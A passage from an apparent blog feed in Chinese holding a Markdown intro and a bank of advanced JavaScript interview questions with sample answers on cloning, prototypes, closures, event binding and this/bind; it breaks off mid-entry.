      &lt;p&gt;markdown 轻量级标记语言（html、xml），它允许人们“使用易读易写的纯文本格式编写文档”，Markdown 最重要的设计就是可读性，Markdown 可以选择性的转换为 HTML 文档格式，很多网站目前都使用了 Markdown 或者其变种，例如Github、简书等大型社区。&lt;/p&gt;
&lt;h2 id=&quot;markdown-特点&quot;&gt;&lt;a href=&quot;#markdown-特点&quot; class=&quot;headerlink&quot; title=&quot;markdown 特点&quot;&gt;&lt;/a&gt;markdown 特点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;纯文本，所以兼容性极强，可以用所有文本编辑器打开&lt;/li&gt;
&lt;li&gt;专注于文字写作而不是排版&lt;/li&gt;
&lt;li&gt;格式转换方便，可以轻松转换为 HTML、PPT、电子书等&lt;/li&gt;
&lt;li&gt;Markdown 标记语法简单好记，可读性强&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="markdown系列" scheme="http://yoursite.com/categories/markdown%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="markdown" scheme="http://yoursite.com/tags/markdown/"/>
    
  </entry>
  
  <entry>
    <title>题库-js 高级</title>
    <link href="http://yoursite.com/2016/06/28/%E9%A2%98%E5%BA%93-js%20%E9%AB%98%E7%BA%A7/"/>
    <id>http://yoursite.com/2016/06/28/题库-js 高级/</id>
    <published>2016-06-27T16:00:00.000Z</published>
    <updated>2018-06-05T07:49:17.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、JQuery一个对象可以同时绑定多个事件，实现原理"><a href="#1、JQuery一个对象可以同时绑定多个事件，实现原理" class="headerlink" title="1、JQuery一个对象可以同时绑定多个事件，实现原理"></a>1、JQuery一个对象可以同时绑定多个事件，实现原理</h2><p>jQuery可以给一个对象同时绑定多个事件，低层实现方式是使用 addEventListner 或 attachEvent 兼容不同的浏览器实现事件的绑定，这样可以给同一个对象注册</p><h2 id="2、webkit、用浏览器的各种工具来调试和debug代码"><a href="#2、webkit、用浏览器的各种工具来调试和debug代码" class="headerlink" title="2、webkit、用浏览器的各种工具来调试和debug代码"></a>2、webkit、用浏览器的各种工具来调试和debug代码</h2><blockquote><p>Webkit是浏览器引擎，包括 html 渲染和 js 解析功能，手机浏览器的主流内核，与之相对应的引擎有 Gecko（Mozilla Firefox 等使用）和 Trident（也称MSHTML，IE 使用）。<br>对于浏览器的调试工具要熟练使用，主要是页面结构分析，后台请求信息查看，js 调试工具使用，熟练使用这些工具可以快速提高解决问题的效率</p></blockquote><a id="more"></a><h2 id="3、如何测试前端代码-知道-BDD-TDD-Unit-Test-么"><a href="#3、如何测试前端代码-知道-BDD-TDD-Unit-Test-么" class="headerlink" title="3、如何测试前端代码? 知道 BDD, TDD, Unit Test 么?"></a>3、如何测试前端代码? 知道 BDD, TDD, Unit Test 么?</h2><p>怎么测试你的前端工程 (mocha, sinon, jasmin, qUnit..)</p><p>了解BDD行为驱动开发与 TDD 测试驱动开发已经单元测试相关概念</p><blockquote><p>TDD：测试驱动开发（Test-Driven Development）</p></blockquote><p>测试驱动开发是敏捷开发中的一项核心实践和技术，也是一种设计方法论。TDD的原理是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。TDD的基本思路就是通过测试来推动整个开发的进行，但测试驱动开发并不只是单纯的测试工作，而是把需求分析，设计，质量控制量化的过程。TDD首先考虑使用需求（对象、功能、过程、接口等），主要是编写测试用例框架对功能的过程和接口进行设计，而测试框架可以持续进行验证。</p><blockquote><p>BDD：行为驱动开发（Behavior Driven Development）</p></blockquote><p>行为驱动开发是一种敏捷软件开发的技术，它鼓励软件项目中的开发者、QA和非技术人员或商业参与者之间的协作。主要是从用户的需求出发，强调系统行为。BDD最初是由Dan North在2003年命名，它包括验收测试和客户测试驱动等的极限编程的实践，作为对测试驱动开发的回应。</p><blockquote><p>ATDD：验收测试驱动开发（Acceptance Test Driven Development）</p></blockquote><p>TDD 只是开发人员的职责，通过单元测试用例来驱动功能代码的实现。在准备实施一个功能或特性之前，首先团队需要定义出期望的质量标准和验收细则，以明确而且达成共识的验收测试计划（包含一系列测试场景）来驱动开发人员的TDD实践和测试人员的测试脚本开发。面向开发人员，强调如何实现系统以及如何检验。</p><h2 id="4、前端-templating-Mustache-underscore-handlebars-是干嘛的-怎么用"><a href="#4、前端-templating-Mustache-underscore-handlebars-是干嘛的-怎么用" class="headerlink" title="4、前端 templating(Mustache, underscore, handlebars) 是干嘛的, 怎么用?"></a>4、前端 templating(Mustache, underscore, handlebars) 是干嘛的, 怎么用?</h2><blockquote><p>Web 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，<br>Mustache 是一个 logic-less （轻逻辑）模板解析引擎，它的优势在于可以应用在 Javascript、PHP、Python、Perl 等多种编程语言中。<br>Underscore封装了常用的JavaScript对象操作方法，用于提高开发效率。<br>Handlebars 是 JavaScript 一个语义模板库，通过对view和data的分离来快速构建Web模板。</p></blockquote><h2 id="5、Handlebars-的基本用法"><a href="#5、Handlebars-的基本用法" class="headerlink" title="5、Handlebars 的基本用法"></a>5、Handlebars 的基本用法</h2><p>没有用过的话说出它是干什么的即可</p><h2 id="6、Handlerbars-的对模板的基本处理流程，-如何编译的？如何缓存的？"><a href="#6、Handlerbars-的对模板的基本处理流程，-如何编译的？如何缓存的？" class="headerlink" title="6、Handlerbars 的对模板的基本处理流程， 如何编译的？如何缓存的？"></a>6、Handlerbars 的对模板的基本处理流程， 如何编译的？如何缓存的？</h2><p>学习技术不仅要会用，还有熟悉它的实现机制，这样在开发中遇到问题时才能更好的解决</p><h2 id="7、用js实现千位分隔符"><a href="#7、用js实现千位分隔符" class="headerlink" title="7、用js实现千位分隔符"></a>7、用js实现千位分隔符</h2><p>原生js的熟练度，实践经验，实现思路</p><h2 id="8、检测浏览器版本版本有哪些方式？"><a href="#8、检测浏览器版本版本有哪些方式？" class="headerlink" title="8、检测浏览器版本版本有哪些方式？"></a>8、检测浏览器版本版本有哪些方式？</h2><p>IE与标准浏览器判断，IE不同版本的判断，<code>userAgent var ie = /*@cc_on !@*/false;</code></p><h2 id="9、实现一个函数-clone"><a href="#9、实现一个函数-clone" class="headerlink" title="9、实现一个函数 clone"></a>9、实现一个函数 clone</h2><p>要求：对JavaScript中的5种主要的数据类型（包括Number、String、Object、Array、Boolean）进行值复制</p><blockquote><p>考察点1：对于基本数据类型和引用数据类型在内存中存放的是值还是指针这一区别是否清楚<br>考察点2：是否知道如何判断一个变量是什么类型的<br>考察点3：递归算法的设计</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法一：</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.clone = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> o = <span class="keyword">this</span>.constructor === <span class="built_in">Array</span> ? [] : &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> e <span class="keyword">in</span> <span class="keyword">this</span>)&#123;</span><br><span class="line">    o[e] = <span class="keyword">typeof</span> <span class="keyword">this</span>[e] === <span class="string">"object"</span> ? <span class="keyword">this</span>[e].clone() : <span class="keyword">this</span>[e];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方法二：</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 克隆一个对象</span></span><br><span class="line"><span class="comment">* @param Obj</span></span><br><span class="line"><span class="comment">* @returns</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">Obj</span>) </span>&#123;   </span><br><span class="line">  <span class="keyword">var</span> buf;   </span><br><span class="line">  <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;   </span><br><span class="line">    buf = [];<span class="comment">//创建一个空的数组 </span></span><br><span class="line">    <span class="keyword">var</span> i = Obj.length;   </span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;   </span><br><span class="line">      buf[i] = clone(Obj[i]);   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> buf;    </span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span> (Obj <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;   </span><br><span class="line">    buf = &#123;&#125;;<span class="comment">//创建一个空对象 </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> Obj) &#123; <span class="comment">//为这个对象添加新的属性 </span></span><br><span class="line">      buf[k] = clone(Obj[k]);   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> buf;   </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//普通变量直接赋值</span></span><br><span class="line">    <span class="keyword">return</span> Obj;   </span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10、小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象："><a href="#10、小贤是一条可爱的小狗-Dog-，它的叫声很好听-wow-，每次看到主人的时候就会乖乖叫一声-yelp-。从这段描述可以得到以下对象：" class="headerlink" title="10、小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象："></a>10、小贤是一条可爱的小狗(Dog)，它的叫声很好听(wow)，每次看到主人的时候就会乖乖叫一声(yelp)。从这段描述可以得到以下对象：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.wow = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">'Wow'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.yelp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.wow();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）"><a href="#11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了-MadDog-，一看到人就会每隔半秒叫一声-wow-地不停叫唤-yelp-。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）" class="headerlink" title="11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）"></a>11、小芒和小贤一样，原来也是一条可爱的小狗，可是突然有一天疯了(MadDog)，一看到人就会每隔半秒叫一声(wow)地不停叫唤(yelp)。请根据描述，按示例的形式用代码来实。（继承，原型，setInterval）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MadDog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.yelp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;          </span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      self.wow();      </span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">MadDog.prototype = <span class="keyword">new</span> Dog();         </span><br><span class="line"><span class="comment">//for test</span></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> Dog();</span><br><span class="line">dog.yelp();</span><br><span class="line"><span class="keyword">var</span> madDog = <span class="keyword">new</span> MadDog();</span><br><span class="line">madDog.yelp();</span><br></pre></td></tr></table></figure><h2 id="12、下面这个ul，如何点击每一列的时候alert其index-（闭包）"><a href="#12、下面这个ul，如何点击每一列的时候alert其index-（闭包）" class="headerlink" title="12、下面这个ul，如何点击每一列的时候alert其index?（闭包）"></a>12、下面这个ul，如何点击每一列的时候alert其index?（闭包）</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=”test”&gt;</span><br><span class="line">&lt;li&gt;这是第一条&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;li&gt;这是第二条&lt;/</span>li&gt;</span><br><span class="line">&lt;li&gt;这是第三条&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 方法一：</span></span><br><span class="line">  <span class="keyword">var</span> lis=<span class="built_in">document</span>.getElementById(<span class="string">'2223'</span>).getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      alert(<span class="keyword">this</span>.index);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//方法二：</span></span><br><span class="line">  <span class="keyword">var</span> lis=<span class="built_in">document</span>.getElementById(<span class="string">'2223'</span>).getElementsByTagName(<span class="string">'li'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    lis[i].index=i;</span><br><span class="line">    lis[i].onclick=(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(a);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)(i);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13、编写一个JavaScript函数，输入指定类型的选择器"><a href="#13、编写一个JavaScript函数，输入指定类型的选择器" class="headerlink" title="13、编写一个JavaScript函数，输入指定类型的选择器"></a>13、编写一个JavaScript函数，输入指定类型的选择器</h2><p>仅需支持id，class，tagName三种简单CSS选择器，无需兼容组合选择器)可以返回匹配的DOM节点，需考虑浏览器兼容性和性能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param selector &#123;String&#125; 传入的CSS选择器。</span></span><br><span class="line"><span class="comment"> * @return &#123;Array&#125;</span></span><br><span class="line"><span class="comment"> * @param  &#123;[type]&#125; selector [description]</span></span><br><span class="line"><span class="comment"> * @return &#123;[type]&#125;          [description]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> query = <span class="function"><span class="keyword">function</span>(<span class="params">selector</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(#)?(\.)?(\w+)$/img</span>;</span><br><span class="line"><span class="keyword">var</span> regResult = reg.exec(selector);</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="comment">//如果是id选择器</span></span><br><span class="line"><span class="keyword">if</span> (regResult[<span class="number">1</span>]) &#123;</span><br><span class="line">  <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.querySelector === <span class="string">"function"</span>) &#123;</span><br><span class="line">      result.push(<span class="built_in">document</span>.querySelector(regResult[<span class="number">3</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      result.push(<span class="built_in">document</span>.getElementById(regResult[<span class="number">3</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (regResult[<span class="number">2</span>]) &#123;<span class="comment">//如果是class选择器</span></span><br><span class="line">  <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.getElementsByClassName === <span class="string">'function'</span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> doms = <span class="built_in">document</span>.getElementsByClassName(regResult[<span class="number">3</span>]);</span><br><span class="line">       <span class="keyword">if</span>(doms) &#123;</span><br><span class="line">          result = converToArray(doms);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//如果不支持getElementsByClassName函数</span></span><br><span class="line">       <span class="keyword">var</span> allDoms = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"*"</span>) ;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = allDoms.length; i &lt; len; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(allDoms[i].className.search(<span class="keyword">new</span> <span class="built_in">RegExp</span>(regResult[<span class="number">2</span>])) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">           result.push(allDoms[i]);</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (regResult[<span class="number">3</span>]) &#123; <span class="comment">//如果是标签选择器</span></span><br><span class="line">    <span class="keyword">var</span> doms = <span class="built_in">document</span>.getElementsByTagName(regResult[<span class="number">3</span>].toLowerCase());</span><br><span class="line">    <span class="keyword">if</span>(doms) &#123;</span><br><span class="line">      result = converToArray(doms);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">converToArray</span>(<span class="params">nodes</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> array = <span class="literal">null</span>;         </span><br><span class="line">  <span class="keyword">try</span>&#123;        </span><br><span class="line">    array = <span class="built_in">Array</span>.prototype.slice.call(nodes,<span class="number">0</span>);<span class="comment">//针对非IE浏览器         </span></span><br><span class="line">  &#125; <span class="keyword">catch</span>(ex) &#123;</span><br><span class="line">    array = <span class="keyword">new</span> <span class="built_in">Array</span>();         </span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span> ,len = nodes.length; i &lt; len ; i++ ) &#123; </span><br><span class="line">      array.push(nodes[i])         </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;      </span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="14、请评价以下代码并给出改进意见"><a href="#14、请评价以下代码并给出改进意见" class="headerlink" title="14、请评价以下代码并给出改进意见"></a>14、请评价以下代码并给出改进意见</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.addEventListener)&#123;</span><br><span class="line">  <span class="keyword">var</span> addListener = <span class="function"><span class="keyword">function</span> (<span class="params">el, type, listener, useCapture</span>) </span>&#123;</span><br><span class="line">    el.addEventListener(type, listener, useCapture);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.all)&#123;</span><br><span class="line">  addListener = <span class="function"><span class="keyword">function</span>(<span class="params">el, type, listener</span>) </span>&#123;</span><br><span class="line">    el.attachEvent(<span class="string">"on"</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      listener.apply(el);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>不应该在 if 和 else 语句中声明 addListener 函数，应该先声明；<br>不需要使用 window.addEventListener 或 document.all 来进行检测浏览器，应该使用能力检测；<br>由于 attachEvent 在 IE 中有 this 指向问题，所以调用它时需要处理一下</p></blockquote><p>改进如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEvent</span> (<span class="params">elem, type, handler</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(elem.addEventListener) &#123;</span><br><span class="line">    elem.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elem.attachEvent) &#123;</span><br><span class="line">      elem[<span class="string">'temp'</span> + type + handler] = handler;</span><br><span class="line">      elem[type + handler] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      elem[<span class="string">'temp'</span> + type + handler].apply(elem);</span><br><span class="line">    &#125;;</span><br><span class="line">    elem.attachEvent(<span class="string">'on'</span> + type, elem[type + handler]);　</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    elem[<span class="string">'on'</span> + type] = handler;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="15、定义一个log方法，让它可以代理-console-log-的方法。"><a href="#15、定义一个log方法，让它可以代理-console-log-的方法。" class="headerlink" title="15、定义一个log方法，让它可以代理 console.log 的方法。"></a>15、定义一个log方法，让它可以代理 console.log 的方法。</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可行的方法一：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">msg</span>)　</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(msg);</span><br><span class="line">&#125;</span><br><span class="line">log(<span class="string">"hello world!"</span>) <span class="comment">// hello world!</span></span><br><span class="line"><span class="comment">// 如果要传入多个参数呢？显然上面的方法不能满足要求，所以更好的方法是：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log.apply(<span class="built_in">console</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>apply和call方法的异同。</p></blockquote><p>对于apply和call两者在作用上是相同</p><p>即是调用一个对象的一个方法，以另一个对象替换当前对象。<br>将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。</p><p>但两者在参数上有区别</p><p>对于第一个参数意义都一样，但对第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，<br>而call则作为call的参数传入（从第二个参数开始）。<br>如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3]) 。</p><h2 id="16、对作用域上下文和this的理解，看下列代码："><a href="#16、对作用域上下文和this的理解，看下列代码：" class="headerlink" title="16、对作用域上下文和this的理解，看下列代码："></a>16、对作用域上下文和this的理解，看下列代码：</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> User = &#123;</span><br><span class="line">  count: <span class="number">1</span>,</span><br><span class="line">  getCount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(User.getCount());  <span class="comment">// what?</span></span><br><span class="line"><span class="keyword">var</span> func = User.getCount;</span><br><span class="line"><span class="built_in">console</span>.log(func());  <span class="comment">// what?</span></span><br></pre></td></tr></table></figure><p>问两处console输出什么？为什么？</p><p>答案是 1 和 undefined。</p><p>func是在winodw的上下文中被执行的，所以会访问不到count属性。</p><blockquote><p>那么如何确保Uesr总是能访问到func的上下文，即正确返回1。<br>正确的方法是使用Function.prototype.bind。兼容各个浏览器完整代码如下：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="built_in">Function</span>.prototype.bind || <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> self.apply(context, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func = User.getCount.bind(User);</span><br><span class="line"><span class="built_in">console</span>.log(func());</span><br></pre></td></tr></table></figure><h2 id="17、原生JS的window-onload与Jquery的-document-ready-function-有什么不同？"><a href="#17、原生JS的window-onload与Jquery的-document-ready-function-有什么不同？" class="headerlink" 